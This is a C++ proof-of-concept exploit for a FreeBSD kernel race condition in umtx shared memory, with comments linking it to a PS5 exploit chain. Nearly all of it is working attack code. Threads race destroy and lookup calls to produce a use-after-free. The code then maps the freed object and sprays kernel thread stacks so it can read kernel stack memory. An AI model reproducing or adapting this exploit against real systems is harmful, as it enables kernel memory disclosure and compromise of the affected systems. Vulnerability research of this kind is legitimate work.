#define SMP
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/umtx.h>
#include <unistd.h>
#include <vector>
#include <array>
#include <atomic>
#include <sys/thr.h>
#include <sys/param.h>
#include <sys/_cpuset.h>
#include <sys/cpuset.h>
#include <sys/ioctl.h>
#include <sys/rtprio.h>

using u8 = uint8_t;
using u32 = uint32_t;
using vu32 = volatile u32;

// This is just to ensure we act like the real exploit code in case fbsd libc wrappers
// do something unexpected.
#define SYSCALL(name) extern "C" decltype(name) __sys_##name;
SYSCALL(open);
SYSCALL(close);
SYSCALL(_umtx_op);
SYSCALL(shm_open);
SYSCALL(shm_unlink);
SYSCALL(mmap);
SYSCALL(munmap);
SYSCALL(mprotect);
SYSCALL(ftruncate);
SYSCALL(fstat);
SYSCALL(sched_yield);
SYSCALL(thr_new);
SYSCALL(thr_exit);
SYSCALL(cpuset_getaffinity);
SYSCALL(cpuset_setaffinity);
SYSCALL(ioctl);
SYSCALL(rtprio_thread);
#undef SYSCALL

static int shm_open_anon() {
    return __sys_shm_open(SHM_ANON, O_RDWR | O_CREAT, 0666);
}

static int umtx_shm(void *addr, u_long flags) {
    return __sys__umtx_op(0, UMTX_OP_SHM, flags, addr, 0);
}

static int umtx_shm_create(void *addr) {
    return umtx_shm(addr, UMTX_SHM_CREAT);
}

static int umtx_shm_lookup(void *addr) {
    return umtx_shm(addr, UMTX_SHM_LOOKUP);
}

static int umtx_shm_destroy(void *addr) {
    return umtx_shm(addr, UMTX_SHM_DESTROY);
}

static int cpuset_getaffinity_tid(id_t tid, cpuset_t *mask) {
    return __sys_cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, tid,
        sizeof(*mask), mask);
}

static int cpuset_setaffinity_tid(id_t tid, const cpuset_t *mask) {
    return __sys_cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, tid,
        sizeof(*mask), mask);
}

static int cpuset_getaffinity_self(cpuset_t *mask) {
    return __sys_cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
        sizeof(*mask), mask);
}

static int cpuset_setaffinity_self(const cpuset_t *mask) {
    return __sys_cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
        sizeof(*mask), mask);
}

using rtprio_t = struct rtprio;

static int rtprio_thread_get(lwpid_t lwpid, rtprio_t *rtp) {
    return rtprio_thread(RTP_LOOKUP, lwpid, rtp);
}

static int rtprio_thread_set(lwpid_t lwpid, const rtprio_t *rtp) {
    return rtprio_thread(RTP_SET, lwpid, (rtprio_t *)rtp);
}

// Mainly to ensure the thr_new can be as isolated as possible (e.g.
// allocating the userspace stack doesn't happen to alloc any kernel objects)
// NOTE only "bare" syscalls can be used from these threads.
struct RopThread {
    static constexpr size_t STACK_SIZE{0x5000};
    static constexpr size_t TLS_SIZE{0x1000};
    RopThread() {
        stack = (u8*)aligned_alloc(0x1000, STACK_SIZE);
        tls = (u8*)aligned_alloc(0x1000, TLS_SIZE);
        bzero(stack, STACK_SIZE);
        bzero(tls, TLS_SIZE);
    }
    ~RopThread() {
        bzero(stack, STACK_SIZE);
        bzero(tls, TLS_SIZE);
        free(stack);
        free(tls);
    }
    int Start() {
        thr_param param = {
            .start_func = ThreadThunk,
            .arg = this,
            .stack_base = (char*)stack,
            .stack_size = STACK_SIZE - 0x1000,
            .tls_base = (char*)tls,
            .tls_size = TLS_SIZE,
            .child_tid = &tid,
            .parent_tid = &tid,
        };
        return __sys_thr_new(&param, sizeof(param));
    }
    static void ThreadThunk(void *arg) {
        auto obj = (RopThread*)arg;
        obj->ThreadFunc();
        obj->done = true;
        while (!obj->do_exit) {}
        __sys_thr_exit(nullptr);
    }
    virtual void ThreadFunc() = 0;
    long ThreadId() {
        // The creating thread should use parent_tid
        return tid;
    }
    void Join() {
        while (!done) {}
        do_exit = true;
    }
    int SetAffinity(size_t cpu_idx) {
        cpuset_t mask;
        CPU_SETOF(cpu_idx, &mask);
        auto rv = cpuset_setaffinity_tid(tid, &mask);
        if (rv < 0) {
            printf("%s:%d\n", __func__, rv);
        }
        return rv;
    }
    int GetAffinity(cpuset_t *mask) {
        return cpuset_getaffinity_tid(tid, mask);
    }
    u8 *stack{};
    u8 *tls{};
    long tid{};
    std::atomic<bool> done{};
    std::atomic<bool> do_exit{};
};

static void *shm_key;
static std::atomic<bool> thread_signal;
static std::atomic<u32> destroy_count;
static std::atomic<u32> destroy_count2;
static std::atomic<u32> lookup_count;
static std::atomic<u32> lookup_done;
static std::atomic<u32> thread_done_count;
static std::atomic<u32> race_state;

static void delay(u32 amount) {
    for (vu32 i = 0; i < amount; i++) {}
}

static void ioctl_spray(u8 val, size_t len) {
    u8 buf[len];
    memset(buf, val, len);
    for (u32 i = 0; i < 100; i++) {
        __sys_ioctl(555555, 0x80000000 | (len << 16), buf);
    }
}

static constexpr bool reclaim_on_main() {
    return true;
}

struct DestroyThread : RopThread {
    void ThreadFunc() final {
        while (true) {
            while (!thread_signal) {}
            destroy_count++;
            while (!lookup_count) {}
            
            int rv = umtx_shm_destroy(shm_key);
            destroy_count2++;
            // TODO care about destroy retval?
            while (destroy_count2 < 2 && lookup_done < 1) {}
            //delay(1000000);
            
            if (!reclaim_on_main()) {
                fd = shm_open_anon();
            }

            thread_done_count++;
            while (!race_state) {}
            if (race_state == 0xdead) {
                return;
            }
            race_state--;
        }
    }
    int fd{-1};
};

struct LookupThread : RopThread {
    void ThreadFunc() final {
        while (true) {
            while (!thread_signal) {}
            lookup_count++;
            while (destroy_count < 2) {}
            
            //delay(10);
            fd = umtx_shm_lookup(shm_key);
            lookup_done++;

            thread_done_count++;
            while (!race_state) {}
            if (race_state == 0xdead) {
                return;
            }
            race_state--;
        }
    }
    int fd{-1};
};

static std::atomic<bool> dummy_signal;
static std::atomic<u32> dummy_count;

struct DummyThread : RopThread {
    void ThreadFunc() final {
        // perform a syscall before notifying that this thread is ready
        __sys_sched_yield();
        dummy_count++;
        while (!dummy_signal) {__sys_sched_yield();}
    }
};

static void hexdump(const void* buf, size_t len) {
    auto data = (u8*)buf;
    for (size_t i = 0; i < len; i++) {
        bool align = ((i + 1) % 16) == 0;
        bool last = i == len - 1;
        bool newline = align || last;
        printf("%02x%c", data[i], newline ? '\n' : ' ');
    }
}

static int fstat_check(int fd, int original_fd, bool verbose = false) {
    struct stat sb{};
    int rv = __sys_fstat(fd, &sb);
    auto size = sb.st_size;
    int size_fd = size / PAGE_SIZE;
    bool suspicious = rv == 0 && size_fd != fd && size_fd != original_fd;
    if (verbose) {
        printf("fstat %d:%d%s(%d)\n", fd, rv, suspicious ? "!!!" : "", size_fd);
        hexdump(&sb, sizeof(sb));
    }
    return suspicious ? size_fd : -1;
}

static void set_shmfd_size(int fd) {
    auto size = fd * PAGE_SIZE;
    __sys_ftruncate(fd, size);

    // doesn't seem to make a difference
    if (0) {
        auto addr = __sys_mmap(nullptr, size, PROT_READ | PROT_WRITE,
            MAP_SHARED, fd, 0);
        memset(addr, 0x41, size);
        __sys_munmap(addr, size);
    }
}

struct RaceResult {
    u32 num_tries;
    int lookup;
    int winner;
};

static RaceResult race() {
    shm_key = malloc(0x100);
    bzero(shm_key, 0x100);

    // Note that sony replaced the fbsd scheduler, and in the real exploit
    // default thread affinity differs from normal fbsd.
    // Normal freebsd defaults threads to all cores at RTP_PRIO_NORMAL priority 0.
    // ps5 defaults threads to core 1 at RTP_PRIO_FIFO priority 700.
    cpuset_t cpumask;
    CPU_SETOF(0, &cpumask);
    cpuset_setaffinity_self(&cpumask);

    std::array<DestroyThread, 2> dthreads;
    for (size_t i = 0; i < dthreads.size(); i++) {
        auto& thread = dthreads[i];
        thread.Start();
        thread.SetAffinity(1 + i);
    }
    
    LookupThread lthread;
    lthread.Start();
    lthread.SetAffinity(1 + dthreads.size());

    for (u32 num_tries = 0; ; num_tries++) {
        thread_signal = false;
        destroy_count = 0;
        destroy_count2 = 0;
        lookup_count = 0;
        lookup_done = 0;
        thread_done_count = 0;
        race_state = 0;

        for (auto &thread : dthreads) {
            thread.fd = -200;
        }
        lthread.fd = -200;

        int original_fd = -1;
        {
        // Create a umtx_shm_reg { ushm_refcnt = 1, ushm_obj = { shm_refs = 2 } }
        int fd = original_fd = umtx_shm_create(shm_key);
        //printf("original fd:%d\n", fd);
        set_shmfd_size(fd);
        // decref ushm_obj->shm_refs
        __sys_close(fd);
        }

        thread_signal = true;
        while (thread_done_count < 3) {}
        thread_signal = false;

        if (reclaim_on_main()) {
            // also works. might make logic easier on real exploit.
            for (u32 i = 0; i < dthreads.size(); i++) {
                // move mainthread to same core as dthread
                CPU_SETOF(1 + i, &cpumask);
                cpuset_setaffinity_self(&cpumask);
                // do the reclaim here instead of on dthread.
                dthreads[i].fd = umtx_shm_create((u8*)shm_key + 8);//shm_open_anon();
                umtx_shm_destroy((u8*)shm_key + 8);
            }
            CPU_SETOF(0, &cpumask);
            cpuset_setaffinity_self(&cpumask);
        }

        for (auto &thread : dthreads) {
            //printf("destroy:%d\n", thread.fd);
            int fd = thread.fd;
            if (fd < 0) {
                continue;
            }
            set_shmfd_size(fd);
            //fstat_check(fd, original_fd);
        }
        
        int winner = -1;
        if (lthread.fd >= 0) {
            //printf("lookup:%d\n", lthread.fd);
            winner = fstat_check(lthread.fd, original_fd);
        }
        for (auto &thread : dthreads) {
            int fd = thread.fd;
            if (fd < 0 || fd == winner) {
                continue;
            }
            //printf("destroy:close:%d\n", fd);
            // no impact to exploit but cleans up fd
            __sys_close(fd);
        }
        
        if (winner >= 0) {
            race_state = 0xdead;
            // cleanup threads
            for (auto &thread : dthreads) {
                thread.Join();
            }
            lthread.Join();

            return { num_tries, lthread.fd, winner };
        }
        
        race_state = 3;
        while (race_state) {}

        // lost: cleanup fd and retry
        // NOTE: if the race succeeded but we failed to reclaim the allocation
        // (via shm_open_anon on a DestroyThread), then closing this fd will
        // cause a doublefree or free of some random kernel allocation - both
        // will cause a panic eventually.
        // If that becomes a problem, could try multiple shm_open_anon.
        __sys_close(lthread.fd);
    }
}

static bool all_zero(u8 *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (buf[i]) {
            return false;
        }
    }
    return true;
}

int main() {
    auto result = race();
    
    printf("race won after %d tries lookup:%d winner:%d\n", result.num_tries,
        result.lookup, result.winner);
    std::array<DummyThread, 20> spray_threads;

    // need at least 1 but amount doesn't seem to matter much?
    u32 fill_count = 1;
    auto spray = (u32*)malloc(fill_count * 4);
    for (u32 i = 0; i < fill_count; i++) {
        umtx_shm_create(&spray[i]);
    }

    //fstat_check(result.lookup, 0, true);
    //fstat_check(result.winner, 0, true);

    // We have 2 fd referencing a shmfd which will be free'd if we close 1 fd...do that
    __sys_close(result.winner);

    // mmap using the remaining fd to reference the free'd but still initialized vmobject.
    // It is possible to set nonzero offset if total size is within bounds (set
    // by truncating the shmfd). However making the shmfd large and then reading
    // off the end of the kstack will segfault.
    auto kstack_len = PAGE_SIZE * 4;
    auto kstack = (u8*)__sys_mmap(nullptr, kstack_len, PROT_READ | PROT_WRITE,
        MAP_SHARED, result.lookup, 0);

    // Spray kernel thread stacks. We want a kstack vmobject to reclaim the
    // free'd one which was just mapped.
    for (auto &t : spray_threads) {
        t.Start();
    }
    while (dummy_count != spray_threads.size()) {}
    
    printf("kstack %p\n", kstack);
    if (all_zero(kstack, kstack_len)) {
        puts("all zero :(");
        // it is safe to exit in this case. we could retry
        // it is unclear why this happens
        return 1;
    }
    hexdump(&kstack[kstack_len - PAGE_SIZE], PAGE_SIZE);
    
    // ctrl+z to send to background for now...
    while (true) {
        __sys_sched_yield();
    }

    free(shm_key);
    return 0;
}
